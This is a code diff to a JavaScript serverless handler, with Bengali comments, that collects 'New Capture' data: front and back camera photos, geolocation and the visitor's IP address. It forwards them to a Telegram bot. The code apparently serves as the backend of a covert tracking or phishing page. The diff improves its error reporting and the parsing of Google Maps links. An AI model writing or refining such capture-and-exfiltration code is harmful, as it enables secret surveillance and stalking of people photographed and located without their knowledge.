@@ -1,6 +1,6 @@
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ success: false });
+    return res.status(405).json({ success: false, error: "Method not allowed" });
   }
 
   const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -11,11 +11,9 @@ export default async function handler(req, res) {
   }
 
   const data = req.body;
-
-  let message = `New Capture:\nTime: ${data.timestamp || new Date().toISOString()}\n`;
-
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "Unknown";
-  message += `IP: ${ip}\n`;
+
+  let message = `New Capture:\nTime: ${data.timestamp || new Date().toISOString()}\nIP: ${ip}\n`;
 
   if (data.type === "front" || data.type === "back") {
     // ছবি পাঠানো
@@ -25,6 +23,7 @@ export default async function handler(req, res) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", new Blob([buffer], { type: 'image/png' }), `${data.type}_photo.png`);
+    formData.append("caption", `${data.type.toUpperCase()} Camera Photo`);
 
     try {
       const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -34,18 +33,24 @@ export default async function handler(req, res) {
 
       const result = await tgRes.json();
       if (!result.ok) {
-        console.error("Telegram photo error:", result);
+        message += `Photo (${data.type}) send failed: ${result.description || "Unknown"}\n`;
       }
     } catch (err) {
-      console.error("Photo send error:", err);
+      message += `Photo (${data.type}) error: ${err.message}\n`;
     }
-
-    message += `Camera: ${data.type.toUpperCase()}\n`;
   }
 
   if (data.geo) {
     message += `Location: ${data.geo}\n`;
-    message += `Map: https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(data.geo.split(' ')[0])}\n`;
+    if (!data.geo.includes("denied") && !data.geo.includes("error")) {
+      const [lat, lonPart] = data.geo.split(',');
+      const lon = lonPart ? lonPart.trim().split(' ')[0] : '';
+      if (lat && lon) {
+        const cleanLat = lat.trim();
+        const cleanLon = lon.trim();
+        message += `Map: https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(cleanLat + ',' + cleanLon)}\n`;
+      }
+    }
   }
 
   // টেক্সট মেসেজ পাঠানো
